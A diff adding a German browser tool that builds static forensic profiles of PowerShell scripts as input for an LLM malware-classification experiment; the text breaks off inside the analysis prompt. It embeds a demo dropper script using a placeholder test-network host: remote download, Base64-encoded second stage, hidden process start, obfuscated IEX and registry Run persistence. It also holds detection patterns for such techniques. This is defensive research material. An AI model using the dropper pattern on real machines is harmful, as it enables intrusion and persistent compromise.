@@ -1,0 +1,825 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Steckbrief-Werkbank</title>
+<style>
+/* Aufbau: Verlauf als schmale Spalte links, rechts von oben nach unten
+   aktuelles Skript, Code neben Steckbrief, darunter Methodik, Prompt, Export.
+   Trennung über Linien statt Karten. Ein Akzent (Petrol), nur für Aktives. */
+:root{
+  color-scheme:light;
+  --weiss:#ffffff; --flaeche:#f4f6f7; --flaeche-2:#e9edef; --linie:#d9dee2; --linie-stark:#b9c1c7;
+  --text:#15191c; --text-2:#4c565e; --text-3:#727c84;
+  --akzent:#0a6a72; --akzent-hell:#e3f1f2; --akzent-dunkel:#07525a;
+  --sans:system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+  --mono:ui-monospace,"Cascadia Mono","SF Mono",Menlo,Consolas,"Liberation Mono",monospace;
+}
+*{box-sizing:border-box}
+html,body{margin:0}
+body{background:var(--weiss);color:var(--text);font-family:var(--sans);font-size:14px;line-height:1.5}
+button,input,select,textarea{font:inherit;color:inherit}
+:focus-visible{outline:2px solid var(--akzent);outline-offset:2px}
+[hidden]{display:none!important}
+
+.kopf{display:flex;flex-wrap:wrap;align-items:center;gap:10px 16px;padding:14px 20px;border-bottom:1px solid var(--linie)}
+.kopf h1{font-size:18px;font-weight:650;margin:0;letter-spacing:-.01em}
+.kopf p{margin:0;color:var(--text-2);font-size:13px;flex:1 1 260px;min-width:0}
+.kopf .aktionen{display:flex;gap:8px;flex-wrap:wrap}
+
+.knopf{background:var(--weiss);border:1px solid var(--linie-stark);border-radius:4px;padding:6px 12px;cursor:pointer;font-size:13px;font-weight:500;line-height:1.3}
+.knopf:hover{background:var(--flaeche)}
+.knopf:active{background:var(--flaeche-2)}
+.knopf.haupt{background:var(--akzent);border-color:var(--akzent);color:#fff}
+.knopf.haupt:hover{background:var(--akzent-dunkel)}
+.knopf.leise{border-color:transparent;color:var(--text-2);padding:4px 8px}
+.knopf.leise:hover{border-color:var(--linie-stark)}
+
+.rahmen{display:grid;grid-template-columns:250px minmax(0,1fr)}
+.verlauf{border-right:1px solid var(--linie);min-height:calc(100vh - 62px);background:var(--flaeche)}
+.verlauf-kopf{display:flex;align-items:baseline;justify-content:space-between;gap:8px;padding:14px 14px 8px}
+.verlauf h2,.haupt h2{font-size:14px;font-weight:650;margin:0}
+.verlauf-zahl{color:var(--text-3);font-size:12px}
+.verlauf-liste{list-style:none;margin:0;padding:0}
+.eintrag{display:block;width:100%;text-align:left;background:none;border:0;border-top:1px solid var(--linie);border-left:3px solid transparent;padding:8px 12px 8px 11px;cursor:pointer}
+.eintrag:hover{background:var(--flaeche-2)}
+.eintrag[aria-current="true"]{background:var(--weiss);border-left-color:var(--akzent)}
+.eintrag .name{display:block;font-family:var(--mono);font-size:12px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.eintrag .zusatz{display:flex;gap:10px;font-size:11.5px;color:var(--text-3);margin-top:2px}
+.eintrag .zusatz .hash{font-family:var(--mono)}
+.eintrag .lab-malicious{color:var(--text);font-weight:600}
+.verlauf-fuss{padding:12px 14px;border-top:1px solid var(--linie);font-size:12px;color:var(--text-3)}
+.verlauf-fuss .knopf{font-size:12px;margin-bottom:6px}
+.verlauf-schalter{display:none}
+
+.haupt{min-width:0}
+.aktiv{padding:14px 20px;border-bottom:1px solid var(--linie)}
+.aktiv-zeile{display:flex;flex-wrap:wrap;align-items:end;gap:10px 16px}
+.feld{display:flex;flex-direction:column;gap:3px;min-width:0}
+.feld label,.feld .feldname{font-size:12px;color:var(--text-2)}
+.feld input,.feld select{border:1px solid var(--linie-stark);border-radius:4px;padding:5px 8px;background:var(--weiss);font-size:13px}
+.feld input{font-family:var(--mono);width:min(340px,70vw)}
+.meta{display:flex;flex-wrap:wrap;gap:4px 22px;margin:10px 0 0;padding:0;font-size:12.5px;color:var(--text-2)}
+.meta div{display:flex;gap:6px;min-width:0}
+.meta dt{margin:0}
+.meta dd{margin:0;font-family:var(--mono);color:var(--text);overflow-wrap:anywhere}
+.hinweis-zeile{margin:8px 0 0;font-size:12.5px;color:var(--text-2)}
+.hinweis-zeile strong{color:var(--text)}
+
+.arbeit{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1.15fr);border-bottom:1px solid var(--linie)}
+.spalte{min-width:0;display:flex;flex-direction:column}
+.spalte + .spalte{border-left:1px solid var(--linie)}
+.spalten-kopf{display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:8px;padding:10px 16px;border-bottom:1px solid var(--linie);min-height:50px}
+#code{flex:1;min-height:460px;border:0;resize:vertical;padding:14px 16px;font-family:var(--mono);font-size:12.5px;line-height:1.55;background:var(--weiss);tab-size:2;white-space:pre;overflow:auto;width:100%}
+#code:focus-visible{outline-offset:-2px}
+
+.stufen{display:inline-flex;border:1px solid var(--linie-stark);border-radius:4px;overflow:hidden}
+.stufen button{background:var(--weiss);border:0;border-left:1px solid var(--linie-stark);padding:5px 11px;cursor:pointer;font-size:12.5px}
+.stufen button:first-child{border-left:0}
+.stufen button:hover{background:var(--flaeche)}
+.stufen button[aria-pressed="true"]{background:var(--akzent);color:#fff;font-weight:600}
+.stufen button:focus-visible{outline-offset:-2px}
+
+.steckbrief{padding:0 16px 16px;overflow-y:auto;max-height:820px}
+.stufe{display:grid;grid-template-columns:26px minmax(0,1fr);gap:0 10px;padding:14px 0;border-bottom:1px solid var(--linie)}
+.stufe:last-child{border-bottom:0}
+.stufe-nr{font-size:20px;font-weight:650;color:var(--akzent);line-height:1.15}
+.stufe h3{margin:0;font-size:14px;font-weight:650}
+.stufe .technik{margin:0 0 8px;font-size:12.5px;color:var(--text-2)}
+.gruppe{margin-top:10px}
+.gruppe h4{margin:0 0 4px;font-size:12.5px;font-weight:600;color:var(--text-2)}
+.gruppe h4 span{font-weight:400;color:var(--text-3)}
+.werte{list-style:none;margin:0;padding:0;font-family:var(--mono);font-size:12px;line-height:1.5;max-height:190px;overflow-y:auto;border:1px solid var(--linie);border-radius:3px;background:var(--flaeche)}
+.werte li{padding:2px 8px;border-top:1px solid var(--linie);overflow-wrap:anywhere}
+.werte li:first-child{border-top:0}
+.fliess{font-family:var(--mono);font-size:12px;margin:0;overflow-wrap:anywhere}
+.leer{font-size:12.5px;color:var(--text-3);margin:0}
+pre.block{margin:0 0 6px;font-family:var(--mono);font-size:12px;line-height:1.5;background:var(--flaeche);border:1px solid var(--linie);border-radius:3px;padding:8px 10px;overflow-x:auto;max-height:230px;white-space:pre}
+table.tokens{border-collapse:collapse;font-size:12px;font-family:var(--mono)}
+table.tokens td{padding:2px 14px 2px 0;border-bottom:1px solid var(--linie)}
+table.tokens td:last-child{text-align:right;padding-right:0;font-variant-numeric:tabular-nums;font-weight:600}
+ol.abfolge{margin:0;padding-left:20px;font-size:13px}
+ol.abfolge li{padding:1px 0}
+
+.inhalte{display:grid;grid-template-columns:repeat(3,minmax(0,1fr))}
+.inhalt{padding:16px 20px;min-width:0}
+.inhalt + .inhalt{border-left:1px solid var(--linie)}
+.inhalt p{margin:8px 0 0;font-size:13px;color:var(--text-2);max-width:68ch}
+.inhalt p strong{color:var(--text)}
+.inhalt pre.block{margin-top:8px;white-space:pre-wrap;max-height:210px}
+.knopf-reihe{display:flex;flex-wrap:wrap;gap:8px;margin-top:10px}
+.export-gruppe{margin-top:12px}
+.export-gruppe h3{margin:0;font-size:13px;font-weight:600}
+.export-gruppe p{margin:2px 0 0;font-size:12.5px}
+details.vorschau{margin-top:10px;font-size:12.5px}
+details.vorschau summary{cursor:pointer;color:var(--akzent);font-weight:500}
+.status{position:fixed;left:50%;bottom:18px;transform:translateX(-50%);background:var(--text);color:#fff;font-size:13px;padding:8px 14px;border-radius:4px;max-width:calc(100vw - 32px)}
+.ablage{position:fixed;inset:0;border:3px dashed var(--akzent);background:rgba(227,241,242,.85);display:flex;align-items:center;justify-content:center;font-size:17px;font-weight:600;color:var(--akzent-dunkel);pointer-events:none;z-index:5}
+
+@media (max-width:1100px){
+  .inhalte{grid-template-columns:1fr}
+  .inhalt + .inhalt{border-left:0;border-top:1px solid var(--linie)}
+}
+@media (max-width:900px){
+  .rahmen{grid-template-columns:1fr}
+  .verlauf{position:static;min-height:0;max-height:none;border-right:0;border-bottom:1px solid var(--linie)}
+  .verlauf-schalter{display:inline-block}
+  .verlauf.zu .verlauf-liste,.verlauf.zu .verlauf-fuss{display:none}
+  .arbeit{grid-template-columns:1fr}
+  .spalte + .spalte{border-left:0;border-top:1px solid var(--linie)}
+  #code{min-height:260px}
+  .steckbrief{max-height:none}
+  .kopf,.aktiv,.inhalt{padding-left:16px;padding-right:16px}
+}
+@media (prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+</head>
+<body>
+
+<header class="kopf">
+  <h1>Steckbrief-Werkbank</h1>
+  <p>Erzeugt aus PowerShell-Code einen statischen Steckbrief in drei Stufen. Feste Regeln, kein Sprachmodell, nichts verlässt diesen Rechner.</p>
+  <div class="aktionen">
+    <button class="knopf haupt" id="btn-laden" type="button">Skripte laden</button>
+    <button class="knopf" id="btn-neu" type="button">Leeres Skript anlegen</button>
+    <input type="file" id="datei" accept=".ps1,.psm1,.psd1,.txt" multiple hidden>
+  </div>
+</header>
+
+<div class="rahmen">
+  <aside class="verlauf zu" id="verlauf" aria-label="Verlauf">
+    <div class="verlauf-kopf">
+      <h2>Verlauf <span class="verlauf-zahl" id="verlauf-zahl"></span></h2>
+      <button class="knopf leise verlauf-schalter" id="btn-verlauf" type="button" aria-expanded="false">Anzeigen</button>
+    </div>
+    <ul class="verlauf-liste" id="verlauf-liste"></ul>
+    <div class="verlauf-fuss">
+      <button class="knopf" id="btn-verlauf-leeren" type="button">Verlauf löschen</button>
+      <div id="speicher-hinweis">Der Verlauf liegt nur in diesem Browser.</div>
+    </div>
+  </aside>
+
+  <main class="haupt">
+    <section class="aktiv" aria-label="Aktuelles Skript">
+      <div class="aktiv-zeile">
+        <div class="feld">
+          <label for="name">Aktuelles Skript</label>
+          <input id="name" type="text" spellcheck="false" autocomplete="off">
+        </div>
+        <div class="feld">
+          <label for="label">Label (nur für die Auswertung)</label>
+          <select id="label">
+            <option value="unbekannt">unbekannt</option>
+            <option value="benign">benign</option>
+            <option value="malicious">malicious</option>
+          </select>
+        </div>
+        <button class="knopf leise" id="btn-entfernen" type="button">Aus Verlauf entfernen</button>
+      </div>
+      <dl class="meta">
+        <div><dt>SHA256</dt><dd id="m-sha"></dd></div>
+        <div><dt>Größe</dt><dd id="m-bytes"></dd></div>
+        <div><dt>Zeilen</dt><dd id="m-zeilen"></dd></div>
+      </dl>
+      <p class="hinweis-zeile" id="m-hinweis" hidden></p>
+    </section>
+
+    <div class="arbeit">
+      <section class="spalte" aria-label="Code">
+        <div class="spalten-kopf"><h2>Code</h2><span class="verlauf-zahl">Einfügen, tippen oder Dateien hierher ziehen</span></div>
+        <textarea id="code" spellcheck="false" autocomplete="off" autocapitalize="off" aria-label="PowerShell-Code"></textarea>
+      </section>
+      <section class="spalte" aria-label="Steckbrief">
+        <div class="spalten-kopf">
+          <h2>Steckbrief</h2>
+          <div class="stufen" role="group" aria-label="Anzeigen und exportieren bis Stufe">
+            <button type="button" data-stufe="1" aria-pressed="false">bis Stufe 1</button>
+            <button type="button" data-stufe="2" aria-pressed="false">bis Stufe 2</button>
+            <button type="button" data-stufe="3" aria-pressed="true">bis Stufe 3</button>
+          </div>
+        </div>
+        <div class="steckbrief" id="steckbrief"></div>
+      </section>
+    </div>
+
+    <div class="inhalte">
+      <section class="inhalt">
+        <h2>Methodik</h2>
+        <p><strong>Der Steckbrief ist die Eingabe für das LLM, nicht dessen Ausgabe.</strong> Er entsteht nach festen Regeln aus <code>steckbrief.py</code> und enthält kein Urteil. Die Einschätzung trifft erst das Modell im Experiment.</p>
+        <p>Berechnet werden immer alle drei Stufen. Der Umschalter legt nur fest, bis zu welcher Stufe angezeigt und für das LLM kopiert wird.</p>
+        <p>Das Label geht nie an das LLM. Es steht nur im Export für die Auswertung.</p>
+      </section>
+      <section class="inhalt">
+        <h2>Analyse-Prompt für das LLM</h2>
+        <pre class="block" id="prompt-text"></pre>
+        <div class="knopf-reihe">
+          <button class="knopf" id="btn-prompt" type="button">Prompt kopieren</button>
+          <button class="knopf" id="btn-prompt-voll" type="button">Prompt mit Steckbrief kopieren</button>
+        </div>
+      </section>
+      <section class="inhalt">
+        <h2>Export</h2>
+        <div class="export-gruppe">
+          <h3>Kopieren für LLM</h3>
+          <p id="llm-beschreibung"></p>
+          <div class="knopf-reihe"><button class="knopf haupt" id="btn-llm" type="button">Steckbrief für LLM kopieren</button></div>
+          <details class="vorschau"><summary>Vorschau des kopierten Texts</summary><pre class="block" id="llm-vorschau"></pre></details>
+        </div>
+        <div class="export-gruppe">
+          <h3>Export für Auswertung</h3>
+          <p>Vollständiges JSON mit Meta, Label und allen drei Stufen, Aufbau wie <code>steckbrief.py</code>.</p>
+          <div class="knopf-reihe">
+            <button class="knopf" id="btn-json" type="button">JSON dieses Skripts</button>
+            <button class="knopf" id="btn-manifest" type="button">Manifest aller Skripte</button>
+            <button class="knopf" id="btn-alle" type="button">Alle Steckbriefe in einer Datei</button>
+          </div>
+        </div>
+        <div class="export-gruppe">
+          <h3>Export als Markdown</h3>
+          <p>Lesbare Fassung dieses Skripts, Aufbau wie <code>to_markdown()</code>.</p>
+          <div class="knopf-reihe"><button class="knopf" id="btn-md" type="button">Markdown dieses Skripts</button></div>
+        </div>
+      </section>
+    </div>
+  </main>
+</div>
+
+<div class="status" id="status" role="status" hidden></div>
+<div class="ablage" id="ablage" hidden>Dateien loslassen, um sie zu laden</div>
+
+<script type="text/plain" id="beispiel"># Beispiel-Skript (Demo, kein echter Schadcode). Adressen aus dem Testnetz 192.0.2.0/24.
+$ErrorActionPreference = 'SilentlyContinue'
+$u  = 'htt'+'p://192.0.2.10/payload'
+$wc = New-Object Net.WebClient
+$data = $wc.DownloadString($u)
+$b  = 'SW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwOi8vMTkyLjAuMi4xMC9zdGFnZTIucHMxIC1PdXRGaWxlICRlbnY6VEVNUFxzdGFnZTIucHMxOyBTdGFydC1Qcm9jZXNzIHBvd2Vyc2hlbGwgLUFyZ3VtZW50TGlzdCAnLW5vcCAtdyBoaWRkZW4gLUZpbGUgc3RhZ2UyLnBzMSc='
+$cmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b))
+I`E`X $cmd
+Start-Process powershell -WindowStyle Hidden -NoProfile -EncodedCommand ZQBjAGgAbwA=
+Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name Updater -Value 'C:\Users\Public\u.ps1'
+</script>
+
+<script>
+"use strict";
+/*CORE-START*/
+// ---------------------------------------------------------------------------
+// Extraktionskern. 1:1 aus steckbrief.py portiert. Kein DOM, kein Netz.
+// Die Regex-Bausteine bilden das Verhalten von Python-re auf Unicode-Text nach
+// (\b, \d und \s sind in Python Unicode-bewusst, in JavaScript nicht).
+const MAX_ANALYZE_BYTES = 200000;
+
+const W  = "[\\p{L}\\p{N}_]";
+const B  = "(?:(?<!" + W + ")(?=" + W + ")|(?<=" + W + ")(?!" + W + "))";       // \b
+const SC = " \\t\\n\\r\\f\\v\\x1c-\\x1f\\x85\\u00a0\\u1680\\u2000-\\u200a\\u2028\\u2029\\u202f\\u205f\\u3000";
+const S  = "[" + SC + "]";                                                       // \s
+const D  = "\\p{Nd}";                                                            // \d
+
+const SUSPICIOUS_TOKENS = [
+  ["invoke_expression",      B + "(?:IEX|Invoke-Expression)" + B],
+  ["encodedcommand",         "-[eE]nc(?:odedCommand)?" + B],
+  ["downloadstring",         B + "DownloadString" + B],
+  ["downloadfile",           B + "DownloadFile" + B],
+  ["webclient",              "New-Object" + S + "+Net\\.WebClient"],
+  ["invoke_webrequest",      B + "Invoke-WebRequest" + B + "|" + B + "iwr" + B + "|" + B + "wget" + B + "|" + B + "curl" + B],
+  ["frombase64",             B + "FromBase64String" + B],
+  ["executionpolicy_bypass", "-[eE]x(?:ecutionPolicy)?" + S + "+Bypass"],
+  ["window_hidden",          "-[wW](?:indowStyle)?" + S + "+[Hh]idden"],
+  ["noprofile",              "-[nN]o[pP](?:rofile)?" + B],
+  ["start_process",          B + "Start-Process" + B],
+  ["reflection_assembly",    "\\[Reflection\\.Assembly\\]|System\\.Reflection"],
+  ["add_type",               B + "Add-Type" + B],
+  ["set_mppreference",       B + "Set-MpPreference" + B],
+  ["amsi",                   "amsi(?:InitFailed|Context|Utils)?"],
+  ["registry_run",           "CurrentVersion\\\\Run|HKCU:|HKLM:"],
+  ["scheduled_task",         B + "Schedule\\.Service" + B + "|" + B + "Register-ScheduledTask" + B],
+  ["char_array",             "\\[char\\](?:" + S + "*" + D + "+|\\[int\\])"],
+];
+const OCTET = "(?:25[0-5]|2[0-4]" + D + "|1?" + D + "?" + D + ")";
+const SRC = {
+  cmdlet: B + "([A-Z][a-z]+)-([A-Z][a-zA-Z]+)" + B,
+  url:    "https?://[^" + SC + "'\"\\\\)>}]+",
+  ipv4:   B + "(?:" + OCTET + "\\.){3}" + OCTET + B,
+  path:   "(?:[A-Za-z]:\\\\[^" + SC + "'\"<>|]+|\\$env:[A-Za-z]+(?:\\\\[^" + SC + "'\"<>|]+)?|%[A-Za-z]+%[^" + SC + "'\"<>|]*)",
+  b64:    "[A-Za-z0-9+/]{40,}={0,2}",
+  str:    "'([^']{3,})'|\"([^\"]{3,})\"",
+  concat: "'([^']*)'" + S + "*\\+" + S + "*'([^']*)'",
+};
+const ORDER_RULES = [
+  ["frombase64",        "Base64-Inhalt dekodieren"],
+  ["encodedcommand",    "kodierten Befehl ausfuehren"],
+  ["downloadstring",    "Inhalt von URL laden"],
+  ["downloadfile",      "Datei von URL herunterladen"],
+  ["invoke_webrequest", "Web-Anfrage senden"],
+  ["webclient",         "WebClient erstellen"],
+  ["invoke_expression", "Zeichenkette als Code ausfuehren"],
+  ["start_process",     "Prozess starten"],
+  ["registry_run",      "Registry-Autostart beruehren"],
+  ["scheduled_task",    "geplante Aufgabe anlegen"],
+  ["set_mppreference",  "Defender-Einstellung aendern"],
+];
+const TOKEN_SRC = Object.fromEntries(SUSPICIOUS_TOKENS);
+const HINWEIS = "Kein Urteil enthalten. Bewertung erfolgt durch das LLM.";
+
+function findAll(src, text, flags) {
+  const re = new RegExp(src, "gu" + (flags || "")), out = [];
+  let m;
+  while ((m = re.exec(text)) !== null) {
+    out.push(m);
+    if (m[0] === "") re.lastIndex++;
+  }
+  return out;
+}
+// Python schneidet und zaehlt in Codepoints, JavaScript in UTF-16-Einheiten.
+const HAS_SURROGATE = /[\uD800-\uDFFF]/;
+function cpSlice(s, n) {
+  if (s.length <= n) return s;
+  if (!HAS_SURROGATE.test(s.slice(0, n + 1))) return s.slice(0, n);
+  let i = 0, c = 0;
+  while (i < s.length && c < n) { i += s.codePointAt(i) > 0xFFFF ? 2 : 1; c++; }
+  return s.slice(0, i);
+}
+function cpCompare(a, b) {
+  const x = Array.from(a), y = Array.from(b), n = Math.min(x.length, y.length);
+  for (let i = 0; i < n; i++) {
+    const d = x[i].codePointAt(0) - y[i].codePointAt(0);
+    if (d) return d;
+  }
+  return x.length - y.length;
+}
+function sortedUnique(arr) { return Array.from(new Set(arr)).sort(cpCompare); }
+
+const PY_STRIP = new RegExp("^" + S + "+|" + S + "+$", "gu");
+const NOT_PRINTABLE = /[\p{C}\p{Zl}\p{Zp}\p{Zs}]/u;       // str.isprintable() == False
+function isPrintableOrWs(ch) {
+  return ch === " " || ch === "\r" || ch === "\n" || ch === "\t" || !NOT_PRINTABLE.test(ch);
+}
+const B64_ALPHA = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+function b64Bytes(blob) {
+  // wie base64.b64decode(blob + Auffuellung, validate=False)
+  const data = blob.replace(/=+$/, "");
+  if (data.length % 4 === 1) return null;
+  const out = new Uint8Array(Math.floor(data.length * 3 / 4));
+  let acc = 0, bits = 0, o = 0;
+  for (let i = 0; i < data.length; i++) {
+    acc = ((acc << 6) | B64_ALPHA.indexOf(data[i])) & 0xFFFFFF;
+    bits += 6;
+    if (bits >= 8) { bits -= 8; out[o++] = (acc >> bits) & 0xFF; }
+  }
+  return out;
+}
+function tryB64Decode(blob) {
+  const raw = b64Bytes(blob);
+  if (raw === null) return null;
+  for (const enc of ["utf-16le", "utf-8"]) {       // UTF-16LE ist bei -EncodedCommand ueblich
+    let txt;
+    try { txt = new TextDecoder(enc, { fatal: true, ignoreBOM: true }).decode(raw); }
+    catch (e) { continue; }
+    if (!txt) continue;
+    let total = 0, printable = 0;
+    for (const ch of txt) { total++; if (isPrintableOrWs(ch)) printable++; }
+    if (printable / total > 0.85) return txt.replace(PY_STRIP, "");
+  }
+  return null;
+}
+
+function stufe1Extract(text) {
+  const strings = [];
+  for (const m of findAll(SRC.str, text)) {
+    const s = m[1] || m[2];
+    if (s) strings.push(s);
+  }
+  const uniq = Array.from(new Set(strings));
+  const blobs = findAll(SRC.b64, text).map(m => m[0]);
+  const decoded = [];
+  for (const blob of blobs) {
+    const d = tryB64Decode(blob);
+    if (d) decoded.push({ laenge: blob.length, dekodiert: cpSlice(d, 1500) });
+  }
+  return {
+    strings: uniq.slice(0, 60),
+    string_anzahl_gesamt: strings.length,
+    base64_bloecke_dekodiert: decoded.slice(0, 10),
+    base64_bloecke_gesamt: blobs.length,
+  };
+}
+function stufe2Features(text) {
+  const tokens = {};
+  for (const [name, src] of SUSPICIOUS_TOKENS) {
+    const n = findAll(src, text).length;
+    if (n) tokens[name] = n;
+  }
+  return {
+    beobachtete_cmdlets: sortedUnique(findAll(SRC.cmdlet, text).map(m => m[1] + "-" + m[2])).slice(0, 40),
+    auffaellige_tokens: tokens,
+    iocs: {
+      urls:  sortedUnique(findAll(SRC.url, text, "i").map(m => m[0])).slice(0, 30),
+      ipv4:  sortedUnique(findAll(SRC.ipv4, text).map(m => m[0])).slice(0, 30),
+      pfade: sortedUnique(findAll(SRC.path, text).map(m => m[0])).slice(0, 30),
+    },
+  };
+}
+function stufe3Structure(text) {
+  let deob = text.split("`").join("");
+  deob = deob.replace(new RegExp(SRC.concat, "gu"), (_, a, b) => "'" + a + b + "'");
+  const decodedCmds = [];
+  for (const m of findAll(SRC.b64, text)) {
+    const d = tryB64Decode(m[0]);
+    if (d) decodedCmds.push(d);
+  }
+  const positions = [];
+  for (const [key, beschreibung] of ORDER_RULES) {
+    const m = new RegExp(TOKEN_SRC[key], "u").exec(text);
+    if (m) positions.push([m.index, beschreibung]);
+  }
+  positions.sort((a, b) => a[0] - b[0] || cpCompare(a[1], b[1]));
+  return {
+    deobfuskiert_auszug: cpSlice(deob, 2000),
+    dekodierte_befehle: decodedCmds.slice(0, 5).map(d => cpSlice(d, 1000)),
+    beobachtete_abfolge: positions.map(p => p[1]),
+  };
+}
+// textFull: dekodierter Inhalt, groesseBytes und sha256: von den Originalbytes.
+function buildSteckbrief(name, textFull, groesseBytes, sha256, label) {
+  const text = cpSlice(textFull, MAX_ANALYZE_BYTES);
+  const meta = {
+    quelldatei: name,
+    sha256: sha256,
+    groesse_bytes: groesseBytes,
+    zeilen: textFull.split("\n").length,
+    ground_truth_label: label,
+    analyse_gekuerzt: groesseBytes > MAX_ANALYZE_BYTES,
+    hinweis: HINWEIS,
+  };
+  const s1 = stufe1Extract(text), s2 = stufe2Features(text), s3 = stufe3Structure(text);
+  return {
+    meta: meta,
+    stufe1_extract: s1,
+    stufe2_features: Object.assign({}, s1, s2),
+    stufe3_structure: Object.assign({}, s1, s2, s3),
+  };
+}
+
+function mdStufe1(sb) {
+  const s1 = sb.stufe1_extract, out = [];
+  out.push("## Stufe 1 - Reine Extraktion");
+  out.push("- Strings gesamt: " + s1.string_anzahl_gesamt + " (Auszug unten)");
+  out.push("- Base64-Bloecke gesamt: " + s1.base64_bloecke_gesamt + ", davon dekodierbar: " + s1.base64_bloecke_dekodiert.length);
+  if (s1.strings.length) {
+    out.push("- Strings (Auszug):");
+    for (const s of s1.strings.slice(0, 15)) out.push("  - `" + cpSlice(s, 120) + "`");
+  }
+  for (const d of s1.base64_bloecke_dekodiert.slice(0, 3)) {
+    out.push("- Dekodierter Base64-Block (Laenge " + d.laenge + "):");
+    out.push("  ```\n  " + cpSlice(d.dekodiert, 400) + "\n  ```");
+  }
+  out.push("");
+  return out;
+}
+function mdStufe2(sb) {
+  const s2 = sb.stufe2_features, out = [];
+  out.push("## Stufe 2 - Statische Merkmale (zusaetzlich)");
+  const tk = Object.entries(s2.auffaellige_tokens);
+  if (tk.length) {
+    out.push("- Auffaellige Tokens (Name: Vorkommen):");
+    for (const [k, v] of tk) out.push("  - " + k + ": " + v);
+  }
+  const code = a => a.slice(0, 8).map(x => "`" + x + "`").join(", ");
+  if (s2.iocs.urls.length)  out.push("- URLs: " + code(s2.iocs.urls));
+  if (s2.iocs.ipv4.length)  out.push("- IPv4: " + code(s2.iocs.ipv4));
+  if (s2.iocs.pfade.length) out.push("- Pfade: " + code(s2.iocs.pfade));
+  if (s2.beobachtete_cmdlets.length) out.push("- Cmdlets: " + s2.beobachtete_cmdlets.slice(0, 20).join(", "));
+  out.push("");
+  return out;
+}
+function mdStufe3(sb) {
+  const s3 = sb.stufe3_structure, out = [];
+  out.push("## Stufe 3 - Struktur (zusaetzlich)");
+  if (s3.beobachtete_abfolge.length) {
+    out.push("- Beobachtete Abfolge:");
+    s3.beobachtete_abfolge.forEach((step, i) => out.push("  " + (i + 1) + ". " + step));
+  }
+  if (s3.dekodierte_befehle.length) {
+    out.push("- Dekodierte Befehle (Auszug):");
+    for (const d of s3.dekodierte_befehle.slice(0, 2)) out.push("  ```\n  " + cpSlice(d, 400) + "\n  ```");
+  }
+  out.push("");
+  return out;
+}
+function toMarkdown(sb) {
+  const m = sb.meta, out = [];
+  out.push("# Steckbrief: " + m.quelldatei);
+  out.push("");
+  out.push("- SHA256: `" + m.sha256 + "`");
+  out.push("- Groesse: " + m.groesse_bytes + " Bytes, " + m.zeilen + " Zeilen");
+  out.push("- Ground-Truth-Label (aus Ordner): **" + m.ground_truth_label + "**");
+  if (m.analyse_gekuerzt) out.push("- Hinweis: Analyse auf erste " + MAX_ANALYZE_BYTES + " Bytes begrenzt");
+  out.push("- " + m.hinweis);
+  out.push("");
+  return out.concat(mdStufe1(sb), mdStufe2(sb), mdStufe3(sb)).join("\n");
+}
+// Text fuer das LLM: nur Stufen-Inhalte bis zur gewaehlten Stufe.
+// Bewusst ohne Meta: kein Label, kein Dateiname, kein Hash.
+function llmText(sb, stufe) {
+  let out = mdStufe1(sb);
+  if (stufe >= 2) out = out.concat(mdStufe2(sb));
+  if (stufe >= 3) out = out.concat(mdStufe3(sb));
+  return out.join("\n").replace(/\n+$/, "") + "\n";
+}
+function toJson(obj) { return JSON.stringify(obj, null, 2); }
+
+function utf8Bytes(text) { return new TextEncoder().encode(text); }
+function decodeUtf8Replace(bytes) { return new TextDecoder("utf-8", { ignoreBOM: true }).decode(bytes); }
+
+// SHA-256 in reinem JavaScript, damit es auch ohne crypto.subtle (file://) laeuft.
+const SHA_K = (function () {
+  const k = new Uint32Array(64), primes = [];
+  for (let n = 2; primes.length < 64; n++) {
+    if (primes.every(p => n % p)) primes.push(n);
+  }
+  primes.forEach((p, i) => { const c = Math.cbrt(p); k[i] = Math.floor((c - Math.floor(c)) * 4294967296); });
+  return k;
+})();
+function sha256Hex(bytes) {
+  const h = new Uint32Array([0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19]);
+  const l = bytes.length, n = ((l + 9 + 63) >> 6) << 6;
+  const m = new Uint8Array(n); m.set(bytes); m[l] = 0x80;
+  const dv = new DataView(m.buffer);
+  dv.setUint32(n - 8, Math.floor(l / 0x20000000)); dv.setUint32(n - 4, (l << 3) >>> 0);
+  const w = new Uint32Array(64), r = (x, s) => (x >>> s) | (x << (32 - s));
+  for (let o = 0; o < n; o += 64) {
+    for (let i = 0; i < 16; i++) w[i] = dv.getUint32(o + i * 4);
+    for (let i = 16; i < 64; i++) {
+      const a = w[i - 15], b = w[i - 2];
+      w[i] = (w[i - 16] + (r(a, 7) ^ r(a, 18) ^ (a >>> 3)) + w[i - 7] + (r(b, 17) ^ r(b, 19) ^ (b >>> 10))) | 0;
+    }
+    let [a, b, c, d, e, f, g, hh] = h;
+    for (let i = 0; i < 64; i++) {
+      const t1 = (hh + (r(e, 6) ^ r(e, 11) ^ r(e, 25)) + ((e & f) ^ (~e & g)) + SHA_K[i] + w[i]) | 0;
+      const t2 = ((r(a, 2) ^ r(a, 13) ^ r(a, 22)) + ((a & b) ^ (a & c) ^ (b & c))) | 0;
+      hh = g; g = f; f = e; e = (d + t1) | 0; d = c; c = b; b = a; a = (t1 + t2) | 0;
+    }
+    h[0] += a; h[1] += b; h[2] += c; h[3] += d; h[4] += e; h[5] += f; h[6] += g; h[7] += hh;
+  }
+  return Array.from(h, x => x.toString(16).padStart(8, "0")).join("");
+}
+/*CORE-END*/
+
+// ---------------------------------------------------------------------------
+// Oberflaeche
+const ANALYSE_PROMPT =
+`Du bist ein Incident-Response-Analyst. Unten steht ein forensischer
+Steckbrief eines PowerShell-Skripts (extrahierte Fakten, kein Urteil).
+Beantworte nur auf Basis dieser Fakten, erfinde nichts dazu:
+1. Ist das Skript bösartig, gutartig oder unklar?
+2. Welche Techniken erkennst du (nenne nur, was im Steckbrief belegt ist)?
